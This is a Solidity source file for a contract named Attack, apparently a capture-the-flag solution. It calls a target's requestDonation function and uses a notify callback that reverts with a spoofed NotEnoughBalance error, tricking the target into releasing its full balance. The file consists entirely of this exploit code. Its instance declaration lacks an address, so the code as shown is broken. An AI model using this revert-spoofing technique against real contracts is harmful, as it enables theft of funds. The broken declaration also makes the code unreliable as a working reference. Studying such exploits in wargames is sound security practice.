// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Instance {

    function requestDonation() external returns(bool enoughBalance);
}

contract Attack {

    Instance instance = Instance();

    error NotEnoughBalance();

    function attack() public {

        instance.requestDonation();
    }

    function notify(uint256 amount) pure external {

        if(amount == 10) {
            revert NotEnoughBalance();
        }
    }
}